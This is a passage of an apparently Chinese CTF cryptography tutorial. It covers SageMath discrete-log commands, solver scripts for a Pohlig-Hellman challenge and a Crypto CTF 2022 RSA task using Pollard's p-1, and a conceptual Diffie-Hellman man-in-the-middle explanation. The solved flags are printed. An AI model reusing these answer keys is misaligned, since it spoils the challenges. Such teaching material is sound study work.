class="line">G=<span class="constructor">GF(<span class="params">p</span>)</span></span><br><span class="line"> </span><br><span class="line">#找一个模p的原根</span><br><span class="line">gp (&#x27;znprimroot(&#x27;+str(p)+<span class="character">&#x27;)&#x27;</span>)</span><br><span class="line">#输出<span class="constructor">Mod(<span class="params">rt</span>,<span class="params">p</span>)</span>，则x是模p的原根</span><br><span class="line">g=<span class="constructor">G(<span class="params">rt</span>)</span></span><br><span class="line"> </span><br><span class="line">#生成私钥</span><br><span class="line">x=<span class="constructor">G(ZZ.<span class="params">random_element</span>(<span class="params">p</span>-1)</span>)</span><br><span class="line"> </span><br><span class="line">#公钥y=g^x <span class="keyword">mod</span> p，由于已经定义在<span class="constructor">GF(<span class="params">p</span>)</span>上，因此g**x就是g^x <span class="keyword">mod</span> p</span><br><span class="line">y=g**x</span><br><span class="line"> </span><br><span class="line">#计算离散对数的通用方法</span><br><span class="line">discrete<span class="constructor">_log(<span class="params">y</span>,<span class="params">g</span>)</span>==x</span><br><span class="line">#n为合数（Pohlig-Hellman）</span><br><span class="line">x = discrete<span class="constructor">_log(<span class="params">mod</span>(<span class="params">b</span>,<span class="params">n</span>)</span>,<span class="keyword">mod</span>(a,n)) </span><br><span class="line">#n为质数或质数幂（线性筛Index Calculus）</span><br><span class="line">R = <span class="constructor">Integers(99)</span></span><br><span class="line">a = <span class="constructor">R(4)</span></span><br><span class="line">b = a^<span class="number">9</span></span><br><span class="line">b.log(a)</span><br><span class="line">#或</span><br><span class="line">x = <span class="built_in">int</span>(pari(f<span class="string">&quot;znlog(&#123;int(b)&#125;,Mod(&#123;int(a)&#125;,&#123;int(n)&#125;))&quot;</span>))</span><br><span class="line">x = gp.znlog(b, gp.<span class="constructor">Mod(<span class="params">a</span>, <span class="params">n</span>)</span>)</span><br><span class="line"> </span><br><span class="line">#计算离散对数的lambda方法</span><br><span class="line">discrete<span class="constructor">_log_lambda(<span class="params">y</span>,<span class="params">g</span>,(<span class="params">floor</span>(ZZ(<span class="params">x</span>)</span>/<span class="number">2</span>),<span class="number">2</span>*<span class="constructor">ZZ(<span class="params">x</span>)</span>))==x</span><br><span class="line"> </span><br><span class="line">#小步大步法计算离散对数</span><br><span class="line">bsgs(g,y,(floor(<span class="constructor">ZZ(<span class="params">x</span>)</span>/<span class="number">2</span>),<span class="number">2</span>*<span class="constructor">ZZ(<span class="params">x</span>)</span>))==x</span><br></pre></td></tr></table></figure><hr><p>回到题目，易得：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">2</span><span class="operator"> ** </span><span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line">m = <span class="constructor">Mod(<span class="params">m</span>, <span class="params">n</span>)</span></span><br><span class="line">c = <span class="constructor">Mod(<span class="params">c</span>, <span class="params">n</span>)</span></span><br><span class="line"></span><br><span class="line">discrete<span class="constructor">_log(<span class="params">c</span>, <span class="params">m</span>)</span></span><br></pre></td></tr></table></figure><p>此外，针对<strong>Pohlig-Hellman</strong>，给出以下例题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">secret = getPrime(<span class="number">128</span>)</span><br><span class="line">m = getPrime(<span class="number">128</span>)</span><br><span class="line">n = getPrime(<span class="number">1024</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, secret, n)</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span>+hashlib.md5(<span class="built_in">str</span>(secret).encode()).hexdigest()+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m = %d&quot;</span> % m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = %d&quot;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br><span class="line"><span class="comment"># m = 211060723077960779250044744266141176829</span></span><br><span class="line"><span class="comment"># n = 89884656743115795386465259539451236680898848947115328636715040578866337902750481566354238661203768010560056939935696678829394884407208311246423715319737062188883946712432742638151109800623047059726541476042502884419075341171231440736956555270413618581675255342293149119974022969989259739901207135911877936187</span></span><br><span class="line"><span class="comment"># c = 32977205552939587326066964781587345932834856116807593874246357335611184723568494377764636367075033866504466671442418777279691941123340914970584204650416137940499348297233941269700668358058974528742129237158207741614517093787264725738282484698794547919205696467463725584733972956537910246421504887816202122161</span></span><br></pre></td></tr></table></figure><p>求解的思路是很明确的，n是1024bits的素数，过大而无法直接调用sage求离散对数。</p><p>尝试分解n-1得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">89884656743115795386465259539451236680898848947115328636715040578866337902750481566354238661203768010560056939935696678829394884407208311246423715319737062188883946712432742638151109800623047059726541476042502884419075341171231440736956555270413618581675255342293149119974022969989259739901207135911877936187</span></span><br><span class="line">factor(n-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 2 * 659 * 144811523 * 158091863 * 167642023 * 194814973 * 198114301509256817 * 1524198318315919100927 * 302061228405984819868188635839278249994068296319393442016901959084878254985929326557136330675603997640265462782948042782543029960066166632904951616712643712462381886167331227465971149482608610738439655060064241698902750467248492676743</span></span><br></pre></td></tr></table></figure><p>n-1光滑，且有些数比较小。</p><p>从198114301509256817后调用sage能把内核跑挂，聚焦前面的数，发现CRT后结果在120bits左右(可以手动扩大到128bits)</p><p>利用<strong>Pohlig-Hellman</strong>的思路，有以下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 89884656743115795386465259539451236680898848947115328636715040578866337902750481566354238661203768010560056939935696678829394884407208311246423715319737062188883946712432742638151109800623047059726541476042502884419075341171231440736956555270413618581675255342293149119974022969989259739901207135911877936187</span></span><br><span class="line"><span class="string">factor(n-1)</span></span><br><span class="line"><span class="string"># 2 * 659 * 144811523 * 158091863 * 167642023 * 194814973 * 198114301509256817 * 1524198318315919100927 * 302061228405984819868188635839278249994068296319393442016901959084878254985929326557136330675603997640265462782948042782543029960066166632904951616712643712462381886167331227465971149482608610738439655060064241698902750467248492676743</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># c = pow(m, secret, n)</span></span><br><span class="line"><span class="comment"># h = g^x mod p</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r</span>(<span class="params">h, g, N, p, qi</span>):</span></span><br><span class="line">    Zp = Zmod(p)</span><br><span class="line">    h = <span class="built_in">pow</span>(h, N//qi, p)</span><br><span class="line">    g = <span class="built_in">pow</span>(g, N//qi, p)</span><br><span class="line">    ri = discrete_log(Zp(h), Zp(g))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(ri)</span><br><span class="line">m = <span class="number">211060723077960779250044744266141176829</span></span><br><span class="line">n = <span class="number">89884656743115795386465259539451236680898848947115328636715040578866337902750481566354238661203768010560056939935696678829394884407208311246423715319737062188883946712432742638151109800623047059726541476042502884419075341171231440736956555270413618581675255342293149119974022969989259739901207135911877936187</span></span><br><span class="line">c = <span class="number">32977205552939587326066964781587345932834856116807593874246357335611184723568494377764636367075033866504466671442418777279691941123340914970584204650416137940499348297233941269700668358058974528742129237158207741614517093787264725738282484698794547919205696467463725584733972956537910246421504887816202122161</span></span><br><span class="line">tmp_list = [<span class="number">659</span>, <span class="number">144811523</span>, <span class="number">158091863</span>, <span class="number">167642023</span>, <span class="number">194814973</span>]</span><br><span class="line">r_list = []</span><br><span class="line"><span class="keyword">for</span> qi <span class="keyword">in</span> tmp_list:</span><br><span class="line">    tmp = r(c,m,n-<span class="number">1</span>,n,qi)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    r_list.append(tmp)</span><br><span class="line">x = crt(r_list, tmp_list)</span><br><span class="line"></span><br><span class="line">module = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp_list:</span><br><span class="line">    module *= i</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(x).bit_length()&gt;<span class="number">128</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">pow</span>(m, x, n))==c:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;x =&#x27;</span>, x)</span><br><span class="line">        flag = <span class="string">&quot;flag&#123;&quot;</span>+hashlib.md5(<span class="built_in">str</span>(x).encode()).hexdigest()+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    x += module</span><br><span class="line"><span class="comment"># x = 256148714020855512578941590011688772421</span></span><br><span class="line"><span class="comment"># flag&#123;bbb04cf5180893e23e559c63ceae5b8f&#125;</span></span><br></pre></td></tr></table></figure><p>类似的，还有Crypto2022CTF上如下一道题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_primes</span>(<span class="params">nbit, imbalance</span>):</span></span><br><span class="line">    p = <span class="number">2</span></span><br><span class="line">    FACTORS = [p]</span><br><span class="line">    <span class="keyword">while</span> p.bit_length() &lt; nbit - <span class="number">2</span> * imbalance:</span><br><span class="line">        factor = getPrime(imbalance)</span><br><span class="line">        FACTORS.append(factor)</span><br><span class="line">        p *= factor</span><br><span class="line">    rbit = (nbit - p.bit_length()) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r, s = [getPrime(rbit) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&#x27;01&#x27;</span>]</span><br><span class="line">        _p = p * r * s</span><br><span class="line">        <span class="keyword">if</span> _p.bit_length() &lt; nbit: rbit += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> _p.bit_length() &gt; nbit: rbit -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(_p + <span class="number">1</span>):</span><br><span class="line">            FACTORS.extend((r, s))</span><br><span class="line">            p = _p + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    FACTORS.sort()</span><br><span class="line">    <span class="keyword">return</span> (p, FACTORS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span>(<span class="params">nbit, imbalance, e</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p, FACTORS = gen_primes(nbit // <span class="number">2</span>, imbalance)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(FACTORS) != <span class="built_in">len</span>(<span class="built_in">set</span>(FACTORS)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        q, q_factors = gen_primes(nbit // <span class="number">2</span>, imbalance + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(q_factors) != <span class="built_in">len</span>(<span class="built_in">set</span>(q_factors)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        factors = FACTORS + q_factors</span><br><span class="line">        <span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> factors:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">return</span> n, (p, q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nbit = <span class="number">2048</span></span><br><span class="line">imbalance = <span class="number">19</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">m_1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>])</span><br><span class="line">m_2 = bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">n, PRIMES = genkey(nbit, imbalance, e)</span><br><span class="line"></span><br><span class="line">c_1 = <span class="built_in">pow</span>(m_1, e, n)</span><br><span class="line">c_2 = <span class="built_in">pow</span>(e, m_2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_1 = <span class="subst">&#123;c_1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_2 = <span class="subst">&#123;c_2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 7069789930583271525053215046247773438899869283661158227309691853515987055334306019600324056376312479212090202373516405860759222837585952590589336295698718699890424169542280710721069784487366121478569760563045886361884895363592898476736269784284754788133722060718026577238640218755539268465317292713320841554802703379684173485217045274942603346947299152498798736808975912326592689302969859834957202716983626393365387411319175917999258829839695189774082810459527737342402920881184864625678296442001837072332161966439361793009893108796934406114288057583563496587655548536011677451960307597573257032154009427010069578913</span></span><br><span class="line"><span class="string">c_1 = 488692928085934899944055554857568564903346089951134051486941368561567330884363274156339625953702601270565654444836193796061118053575538224794730472032345171432952984560662218697488844007827176184413713651118743456250147472678673801728916283759932987216388378211555067885210167894310696549664382751443669387953644382833924884208966436685137553434532738845959014828804809425096115758364136546390809453200055265653531950423111482644330073443545410319576097902472017235065047191133112557289289189187696092145850680765843608118584107829268136014912479701945735063525799796920293418182776436767911172221104640501952880057</span></span><br><span class="line"><span class="string">c_2 = 109770827223661560471527567179288748906402603483328748683689436879660543465776899146036833470531024202351087008847594392666852763100570391337823820240726499421306887565697452868723849092658743267256316770223643723095601213088336064635680075206929620159782416078143076506249031972043819429093074684182845530529249907297736582589125917235222921623698038868900282049587768700860009877737045693722732170123306528145661683416808514556360429554775212088169626620488741903267154641722293484797745665402402381445609873333905772582972140944493849645600529147490903067975300304532955461710562911203871840101407995813072692212</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>显然，利用Pollard‘s p-1方法分解n</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Pollard‘s <span class="keyword">p</span>-<span class="number">1</span> method</span><br><span class="line"># http<span class="variable">s:</span>//blog.csdn.net/m0_62506844/article/details/<span class="number">125774485</span></span><br><span class="line">from gmpy2 import *</span><br><span class="line"><span class="keyword">N</span> = <span class="number">7069789930583271525053215046247773438899869283661158227309691853515987055334306019600324056376312479212090202373516405860759222837585952590589336295698718699890424169542280710721069784487366121478569760563045886361884895363592898476736269784284754788133722060718026577238640218755539268465317292713320841554802703379684173485217045274942603346947299152498798736808975912326592689302969859834957202716983626393365387411319175917999258829839695189774082810459527737342402920881184864625678296442001837072332161966439361793009893108796934406114288057583563496587655548536011677451960307597573257032154009427010069578913</span></span><br><span class="line"><span class="keyword">a</span> = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">a</span> = powmod(<span class="keyword">a</span>, n, <span class="keyword">N</span>)</span><br><span class="line">    <span class="keyword">res</span> = gcd(<span class="keyword">a</span>-<span class="number">1</span>, <span class="keyword">N</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">res</span> != <span class="number">1</span> <span class="built_in">and</span> <span class="keyword">res</span> != <span class="keyword">N</span>:</span><br><span class="line">        q = <span class="keyword">N</span> // <span class="keyword">res</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;p=&quot;</span>,<span class="keyword">res</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>其后，考察离散对数</p><p>根据p、q光滑的性质与flag大小关系，可简化运算</p><p>可以先分别求出$m_2 \mod (p-1)$与$m_2 \mod (q-1)$的值，再CRT求出$m_2$</p><p>也观察到，对比特位而言p&gt;m2=m1，所以有$m_2 = m_2 \mod (p-1)$, 无需CRT</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from <span class="module-access"><span class="module"><span class="identifier">Crypto</span>.</span><span class="module"><span class="identifier">Util</span>.</span></span>number import<span class="operator"> *</span></span><br><span class="line"><span class="operator"></span></span><br><span class="line"><span class="operator"></span>N = <span class="number">7069789930583271525053215046247773438899869283661158227309691853515987055334306019600324056376312479212090202373516405860759222837585952590589336295698718699890424169542280710721069784487366121478569760563045886361884895363592898476736269784284754788133722060718026577238640218755539268465317292713320841554802703379684173485217045274942603346947299152498798736808975912326592689302969859834957202716983626393365387411319175917999258829839695189774082810459527737342402920881184864625678296442001837072332161966439361793009893108796934406114288057583563496587655548536011677451960307597573257032154009427010069578913</span></span><br><span class="line">c_1 = <span class="number">488692928085934899944055554857568564903346089951134051486941368561567330884363274156339625953702601270565654444836193796061118053575538224794730472032345171432952984560662218697488844007827176184413713651118743456250147472678673801728916283759932987216388378211555067885210167894310696549664382751443669387953644382833924884208966436685137553434532738845959014828804809425096115758364136546390809453200055265653531950423111482644330073443545410319576097902472017235065047191133112557289289189187696092145850680765843608118584107829268136014912479701945735063525799796920293418182776436767911172221104640501952880057</span></span><br><span class="line">c_2 = <span class="number">109770827223661560471527567179288748906402603483328748683689436879660543465776899146036833470531024202351087008847594392666852763100570391337823820240726499421306887565697452868723849092658743267256316770223643723095601213088336064635680075206929620159782416078143076506249031972043819429093074684182845530529249907297736582589125917235222921623698038868900282049587768700860009877737045693722732170123306528145661683416808514556360429554775212088169626620488741903267154641722293484797745665402402381445609873333905772582972140944493849645600529147490903067975300304532955461710562911203871840101407995813072692212</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">83408372012221120677052349409462320990177094246143674474872152829440524098582262384066400107950985845255268335597502228206679771838750219696329523257176739436871327238322817403970284015587320158034304282786944710043150568360761457471641695390427267786485448748458445872307883254297662715749746270343116946519</span></span><br><span class="line"></span><br><span class="line">q = N <span class="comment">// p</span></span><br><span class="line"></span><br><span class="line">Zp, Zq = <span class="constructor">Zmod(<span class="params">p</span>)</span>, <span class="constructor">Zmod(<span class="params">q</span>)</span></span><br><span class="line">d = inverse<span class="constructor">_mod(<span class="params">e</span>, (<span class="params">p</span>-1)</span>*(q-<span class="number">1</span>))</span><br><span class="line">m_1 = <span class="built_in">int</span>(pow(c_1, d, N))</span><br><span class="line">print(long<span class="constructor">_to_bytes(<span class="params">m_1</span>)</span>.decode<span class="literal">()</span>,<span class="keyword">end</span>=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">m_2p = discrete<span class="constructor">_log(Zp(<span class="params">c_2</span>)</span>, <span class="constructor">Zp(<span class="params">e</span>)</span>)</span><br><span class="line"># m_2q = discrete<span class="constructor">_log(Zq(<span class="params">c_2</span>)</span>, <span class="constructor">Zq(<span class="params">e</span>)</span>)</span><br><span class="line"># m_2 = crt(<span class="literal">[<span class="identifier">m_2p</span>, <span class="identifier">m_2q</span>]</span>, <span class="literal">[<span class="identifier">p</span>-<span class="number">1</span>, <span class="identifier">q</span>-<span class="number">1</span>]</span>)</span><br><span class="line">print(long<span class="constructor">_to_bytes(<span class="params">m_2p</span>)</span>.decode<span class="literal">()</span>)</span><br><span class="line"># CCTF&#123;<span class="number">5L</span>3Ek_4s__s1lK__Ri9H7?!&#125;</span><br></pre></td></tr></table></figure><p><strong>接下来步入主题——DH</strong></p><h2 id="密钥交换协议-（Diffie-Hellman）"><a href="#密钥交换协议-（Diffie-Hellman）" class="headerlink" title="密钥交换协议 （Diffie Hellman）"></a>密钥交换协议 （Diffie Hellman）</h2><ul><li><a href="https://blog.csdn.net/happy_single/article/details/106175275?ops_request_misc=&request_id=&biz_id=102&utm_term=密钥交换协议%20中间人攻击&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-106175275.142^v9^control,157^v4^new_style&spm=1018.2226.3001.4187">参考</a></li></ul><p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH%E5%8D%8F%E8%AE%AE%E5%8F%8AElGamal%E5%8A%A0%E5%AF%86%E6%96%B9%E6%A1%88%E7%9A%84%E5%AE%9E%E7%8E%B0-125e55ac.png" alt="Diffie Hellman"></p><blockquote><p> 以两位发明者命名的密码方案，其思想为理解ElGamal加密奠定了基础。</p></blockquote><p>总体而言，密钥交换协议<strong>不是</strong>一种<strong>加密明文的算法</strong>，而是<strong>生成</strong>一个较为安全的<strong>密钥的算法</strong>。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>公布一个质数q(最好是2048位)，然后在Zp中找到一个生成元g，也公布出来</li><li>Alice选一个私钥$X_A$，$X_A∈Z_{p−1}$，得到公钥$Y_A = g^{X_A} \mod q$，并将$Y_A$传给Bob</li><li>Bob也选好私钥$X_B$, 得到公钥$Y_B=g^{X_B} \mod q$发给Alice</li><li>公布YA、YB</li><li>收到YB的Alice可以得到$K=(Y_B)^{X_A}=(g^{Y_B})^{X_A}=g^{X_A*Y_B} \mod q$</li><li>收到YA的Bob也可以得到$K=(Y_A)^{X_B}=(g^{Y_A})^{X_B}=g^{X_A*X_B} \mod q$</li></ol><p>显然Alice和Bob得到了一份相同的信息，而对于攻击者而言，由YA推出XA是困难的，同理也无法得到XB，所以攻击者无法得知这相同的信息</p><p>能不能用这性质直接传递密文呢?</p><p><strong>显然是不能的</strong></p><p>Alice和Bob无法控制最后K的内容，所以K更适合当作其他加密体系的私钥</p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>值得一说，密钥交换协议的数学理论是自洽的、安全的</p><p>也就是说，中间人攻击不是从数学层面上硬核破解出Alice和Bob所生成的私钥</p><p>而是以欺诈的手段，下面先看一张攻击的流程图</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/20200517153922472.png" alt="中间人攻击"></p><p>仔细说一下</p><ol><li><p>攻击者能知道g和q，于是自己随意生成两个私钥$X_{D_1}、X_{D_2}$，并用其生成两个公钥</p><ul><li>$Y_{D_1} = a^{X_{D_1}} \mod q$</li><li>$Y_{D_2} = a^{X_{D_2}} \mod q$</li></ul></li><li><p>在Alice对外公布$Y_A$时，攻击者截获它（不让Bob收到$Y_A$）,然后：</p><p><strong>不能让Bob收不到东西，攻击者给Bob传输$Y_{D_1}$</strong></p></li><li><p>同理，攻击者截获Bob发的$Y_B$,然后给Alice发$Y_{D_2}$</p></li><li><p>Alice以为自己收到的是Bob的，于是开始生成</p><p>$K_2=(Y_{D_2})^{X_A}=(g^{X_{D_2}})^{X_A} = g^{X_{D_2}*X_A}$</p></li><li><p>而对于攻击者，则有：</p><p>$K_2=(Y_{A})^{X_{D_2}}=(g^{X_{A}})^{X_{D_2}} = g^{X_{D_2}*X_A}$</p><p>即：攻击者获得了Alice所生成的、用来加密的密钥，也就可以破解Alice后续发的密文了</p></li><li><p>同理，Bob也有如下操作</p><p>$K_1=(Y_{D_1})^{X_B}=(g^{X_{D_1}})^{X_B} = g^{X_{D_1}*X_B}$</p></li><li><p>而对于攻击者，也有：</p><p>$K_2=(Y_{B})^{X_{D_1}}=(g^{X_{B}})^{X_{D_1}} = g^{X_{D_1}*X_B}$</p><p>同样的，Bob用这个<strong>DH协议所生成的密钥</strong> 来 <strong>加密的密文</strong> 都能被攻击者破解</p></li></ol><p>值得一说，若攻击者不想让Alice与Bob察觉异样，他也能做到破解完密文后，修改明文后再加密发给另一方</p><p>而DH协议能被破解的关键则在于Alice和Bob<strong>无法确认信息的发送方</strong>，所以攻击者充当了中转站的角色分别与A、B进行DH协议</p><p>更具体的实现、以及实际渗透应用这里暂且省略</p><h2 id="ElGamal加密算法"><a href="#ElGamal加密算法" class="headerlink" title="ElGamal加密算法"></a>ElGamal加密算法</h2><p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH%E5%8D%8F%E8%AE%AE%E5%8F%8AElGamal%E5%8A%A0%E5%AF%86%E6%96%B9%E6%A1%88%E7%9A%84%E5%AE%9E%E7%8E%B0-a4564ef7.png" alt="ElGamal"></p><p>同样是以发明者命名的算法。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>ElGamal加密算法是一个<strong>基于DH密钥交换</strong>的<strong>非对称加密算法</strong></p><p>它在1985年由塔希尔·盖莫尔提出，GnuPG和PGP等很多密码学系统中都应用到了ElGamal算法。</p><p>ElGamal加密算法可以定义在任何循环群G上，安全性取决于G上的离散对数难题。</p></blockquote><h3 id="加-解密流程"><a href="#加-解密流程" class="headerlink" title="加 \ 解密流程"></a>加 \ 解密流程</h3><blockquote><p>流程学习参考<a href="https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/">lazzro相关博客</a></p><p>代码学习参考<a href="https://4xwi11.github.io/posts/898249b7/#ElGamal加密方案">4XWi11师傅相关博客</a></p></blockquote><p>这里依然以Alice与Bob举例，即：<strong>Alice打算给Bob发消息</strong></p><h4 id="加密"><a 